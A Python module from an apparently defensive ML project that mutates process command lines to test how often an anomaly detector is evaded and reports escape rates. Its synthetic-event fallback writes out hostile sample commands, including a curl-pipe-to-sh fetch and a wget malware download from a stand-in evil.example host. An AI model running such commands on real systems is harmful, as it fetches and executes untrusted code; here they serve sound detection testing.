"""Robustness evaluation runner (issue #45).

Applies mutators to scenario events, scores original vs mutated, and generates a
RobustnessCard with escape rate and degradation metrics. Mirrors the pattern of
scenario_replay.py but for adversarial evaluation rather than functional detection.

Flow:
1. Load the scenario's expected_detections.
2. Choose the events under test: the exec records of an events source when one is given,
   otherwise one synthetic malicious event per expected detection.
3. Apply each mutator of the tier at light/medium/heavy and score original vs mutated.
4. Aggregate the results into the card (escape_rate, degradations).
"""

from __future__ import annotations

import statistics
from collections.abc import Sequence
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from synthaea_ml.data.canonical import ml_cmdline_from_record
from synthaea_ml.data.jsonl import InvalidLine, iter_jsonl
from synthaea_ml.data.wire import flatten_wire_event
from synthaea_ml.evaluation.mutations.base import Mutator
from synthaea_ml.evaluation.mutations.cmdline import ALL_T0_MUTATORS
from synthaea_ml.evaluation.mutations.prng import LCG
from synthaea_ml.evaluation.scenario_replay import load_expected_detections
from synthaea_ml.features import correlation, t1
from synthaea_ml.features.cmdline import extract_features
from synthaea_ml.hashing import sha256_file
from synthaea_ml.registry.records import ExpectedDetection, MutationTestResult, RobustnessCard

# Every mutator runs at each intensity, in this order: the LCG draws depend on it.
_INTENSITIES = ("light", "medium", "heavy")

# Fields of an exec record kept beside its command line: the lineage the T1 tier scores
# and the lineage mutators rewrite, and the process identity its correlation context is
# filtered by.
_EXEC_CONTEXT_KEYS = ("parent_comm", "parent_image_path", "pid", "process_generation")


def _score_cmdline(model: Any, cmdline: str) -> float:
    """Anomaly score of one command line (NUL-separated tokens).

    IsolationForest convention: negative = more anomalous, positive = benign.
    """
    return float(model.decision_function([extract_features(cmdline)])[0])


def _score_record(model: Any, record: dict[str, Any], tier: str) -> float:
    """Anomaly score of one record at `tier` (negative = more anomalous).

    T0 scores the command line alone; T1 also scores the correlation context. The lineage
    is not in the T1 vector (ADR-0034), so no lineage mutator runs against it.
    """
    if tier == "T1":
        expected = getattr(model, "n_features_in_", t1.FEATURE_COUNT)
        if expected != t1.FEATURE_COUNT:
            raise ValueError(
                f"T1 robustness needs a model trained on {t1.FEATURE_COUNT} features "
                f"(cmdline + correlation); this model expects {expected}"
            )
        return float(model.decision_function([t1.extract_features(record)])[0])
    return _score_cmdline(model, ml_cmdline_from_record(record))


def _select_mutators_for_tier(tier: str) -> list[Mutator]:
    """Select mutators appropriate for the tier.

    Args:
        tier: One of "T0", "T1", "T2".

    Returns:
        List of mutator instances.

    Raises:
        NotImplementedError: For "T2", which has no mutators yet.
        ValueError: If tier is invalid.
    """
    if tier == "T0":
        return ALL_T0_MUTATORS
    if tier == "T1":
        # The command-line mutators apply (the cmdline block is part of the T1 vector). The
        # lineage mutators do not: the parent is not scored by the model (ADR-0034), so an
        # escape rate over them would be a flattering zero.
        return ALL_T0_MUTATORS
    if tier == "T2":
        raise NotImplementedError("T2 mutators not yet implemented")
    raise ValueError(f"invalid tier: {tier}")


def run_robustness_evaluation(
    model: Any,
    scenario_yaml: Path,
    *,
    tier: str = "T0",
    mutation_seed: int = 42,
    threshold: float = 0.0,
    events_source: Path | None = None,
) -> RobustnessCard:
    """Run adversarial evaluation on one scenario.

    Args:
        model: Trained model (sklearn IsolationForest with decision_function).
        scenario_yaml: Path to scenario yaml (e.g., ../scenarios/scenarios/beacon.yaml).
        tier: Mutation tier ("T0", "T1", "T2"). Default "T0".
        mutation_seed: Seed for deterministic PRNG. Default 42.
        threshold: Detection threshold: a score at or below it is detected. Default 0.0,
            the IsolationForest decision boundary.
        events_source: Optional events.jsonl or baseline.jsonl holding MALICIOUS events
            that match the scenario's expected_detections (escape rate is only meaningful
            on originally-detected samples). When it is None, missing, or holds no exec
            record, one synthetic event per expected detection is used instead.

    Returns:
        RobustnessCard with mutation results and aggregate metrics.

    Raises:
        FileNotFoundError: If the scenario yaml is missing.
        NotImplementedError: If tier is "T2".
        ValueError: If tier is invalid, the scenario has no detections, no mutation
            produced a result, or no event was originally detected.
    """
    scenario_name, expected = load_expected_detections(scenario_yaml)
    mutators = _select_mutators_for_tier(tier)
    if not expected:
        raise ValueError(f"scenario {scenario_name!r} has no expected_detections")

    events = _events_under_test(expected, tier, events_source)
    results = _mutation_results(
        model, events, mutators, rng=LCG(seed=mutation_seed), threshold=threshold, tier=tier
    )
    return _card_from_results(scenario_name, scenario_yaml, results, threshold)


def _events_under_test(
    expected: Sequence[ExpectedDetection], tier: str, events_source: Path | None
) -> list[dict[str, Any]]:
    """The exec records of `events_source`, or one synthetic event per expected detection
    when there is no source, it does not exist or it holds no exec record."""
    if events_source and events_source.exists():
        loaded = _load_events_from_source(events_source, with_context=(tier == "T1"))
        if loaded:
            return loaded
    return [_create_synthetic_event_for_detection(d.technique, tier) for d in expected]


def _mutation_results(
    model: Any,
    events: Sequence[dict[str, Any]],
    mutators: Sequence[Mutator],
    *,
    rng: LCG,
    threshold: float,
    tier: str,
) -> list[MutationTestResult]:
    """Score every event against each mutator at each intensity.

    The loop nesting (event, then mutator, then intensity) fixes the order of the LCG
    draws, which the recorded `seed` of each result exposes: do not reorder it. A
    mutation that raises `ValueError` (empty argv, invalid record) is skipped.
    """
    results: list[MutationTestResult] = []
    for event in events:
        original_score = _score_record(model, event, tier)
        for mutator in mutators:
            for intensity in _INTENSITIES:
                try:
                    mutated_score = _score_record(model, mutator.mutate(event, intensity, rng), tier)
                except ValueError:
                    continue
                results.append(
                    MutationTestResult(
                        mutation_class=mutator.mutation_class_name(),
                        intensity=intensity,
                        original_score=original_score,
                        mutated_score=mutated_score,
                        score_delta=mutated_score - original_score,
                        threshold=threshold,
                        escaped=mutated_score > threshold and original_score <= threshold,
                        seed=rng.state,
                    )
                )
    return results


def _card_from_results(
    scenario_name: str,
    scenario_yaml: Path,
    results: list[MutationTestResult],
    threshold: float,
) -> RobustnessCard:
    """Aggregate the mutation results of one scenario into its card.

    The escape rate counts only the originally-detected results (`original_score <=
    threshold`): an event the model never detected cannot escape. The degradations
    cover every result; a positive delta moved the score toward benign, so the worst
    case is the largest delta.
    """
    if not results:
        raise ValueError(f"no mutation results for scenario {scenario_name!r}")

    originally_detected = [r for r in results if r.original_score <= threshold]
    if not originally_detected:
        # Typically an events_source of benign baseline events instead of malicious ones.
        raise ValueError(
            f"no originally-detected samples for scenario {scenario_name!r} "
            f"(all {len(results)} samples had original_score > {threshold}). "
            f"Are you using malicious events, not benign baseline?"
        )

    score_deltas = [r.score_delta for r in results]
    return RobustnessCard(
        scenario_name=scenario_name,
        scenario_yaml_sha256=sha256_file(scenario_yaml),
        tested_at=datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ"),
        mutation_results=results,
        escape_rate=sum(r.escaped for r in originally_detected) / len(originally_detected),
        median_score_degradation=statistics.median(score_deltas),
        worst_case_degradation=max(score_deltas),
    )


def _load_events_from_source(
    events_source: Path, with_context: bool = False
) -> list[dict[str, Any]]:
    """Load exec events from events.jsonl or baseline.jsonl file.

    Lines that are blank, not JSON or not a JSON object are skipped silently.

    Args:
        events_source: Path to JSONL file containing events.
        with_context: Also attach what the T1 tier scores beyond the command line:
            `correlation_features` (computed from the whole file as one correlation
            window, filtered by `(pid, process_generation)`) on every exec record
            that has a pid. Off for T0, which scores the command line alone.

    Returns:
        List of event records with cmdline/argv fields, plus `parent_comm` /
        `parent_image_path` whenever the source carries them (the lineage the T1 tier
        scores and the lineage mutators rewrite).

    Raises:
        FileNotFoundError: If events_source does not exist.
    """
    if not events_source.exists():
        raise FileNotFoundError(f"events_source not found: {events_source}")

    records = [
        _flat_record(record) for record in iter_jsonl(events_source, on_invalid=InvalidLine.SKIP)
    ]
    events = [view for record in records if (view := _exec_view(record)) is not None]
    if with_context:
        window = [record for record in records if "pid" in record and "type" in record]
        _attach_correlation(events, window)
    return events


def _flat_record(record: dict[str, Any]) -> dict[str, Any]:
    """The record with the identity the agent's own events.jsonl nests under `meta`
    lifted to the top level, so events the agent recorded carry their pid, incarnation and lineage
    into the T1 tier. Baseline and hand-built records are already flat, and a wire event
    of a type the flattener does not know is kept as it is."""
    if "meta" in record:
        return flatten_wire_event(record) or record
    return record


def _exec_view(record: dict[str, Any]) -> dict[str, Any] | None:
    """What the robustness evaluation scores of one exec record, or None for a record
    that is not an exec or carries no command line.

    An exec is a record of type `exec` or any record with `argv` or `cmdline` (baseline
    format). The view holds `argv` and `cmdline` (None when absent), or `cmdline` alone
    for a Windows record without `argv`, followed by whichever of `_EXEC_CONTEXT_KEYS`
    the record carries, in that order.
    """
    if record.get("type") != "exec" and "argv" not in record and "cmdline" not in record:
        return None
    if "argv" in record:
        view: dict[str, Any] = {"argv": record["argv"], "cmdline": record.get("cmdline")}
    elif record.get("cmdline", "").strip() != "":
        view = {"cmdline": record["cmdline"]}
    else:
        return None
    view.update({key: record[key] for key in _EXEC_CONTEXT_KEYS if key in record})
    return view


def _attach_correlation(events: list[dict[str, Any]], window: list[dict[str, Any]]) -> None:
    """Add `correlation_features` to every exec view that has a pid, computed over the
    whole `window` and filtered by the view's `(pid, process_generation)`."""
    for event in events:
        if "pid" in event:
            event["correlation_features"] = correlation.extract_features(
                window, event["pid"], event.get("process_generation")
            )


def _create_synthetic_event_for_detection(technique: str, tier: str = "T0") -> dict[str, Any]:
    """Create synthetic event for a detection technique.

    Fallback when no events_source is provided. Maps ATT&CK technique to
    plausible malicious command line.

    Args:
        technique: ATT&CK technique(s) like "T1071" or "T1059/T1071".
        tier: At "T1" the record also carries the suspicious lineage that technique
            typically arrives with (a web server spawning a shell, a dropper in a temp
            directory), so the lineage mutators have something to move. "T0" output
            is the bare command line, unchanged.

    Returns:
        Synthetic event record with argv field.
    """
    # Map technique to plausible malicious command line
    if "T1071" in technique:  # Command and Control
        record: dict[str, Any] = {
            "argv": ["curl", "-fsSL", "https://evil.example/payload", "|", "sh"]
        }
        parent = ("dropper", "/tmp/dropper")
    elif "T1059" in technique:  # Command and Scripting Interpreter
        record = {"argv": ["bash", "-c", "echo aGVsbG8= | base64 -d"]}
        parent = ("nginx", "/usr/sbin/nginx")
    elif "T1105" in technique:  # Ingress Tool Transfer
        record = {"argv": ["wget", "-O", "/tmp/malware", "https://evil.example/tool"]}
        parent = ("bash", "/tmp/dropper")
    else:
        # Default: generic suspicious command
        record = {"argv": ["bash", "-c", "base64 -d"]}
        parent = ("dropper", "/dev/shm/payload")

    if tier == "T1":
        record["parent_comm"], record["parent_image_path"] = parent
    return record
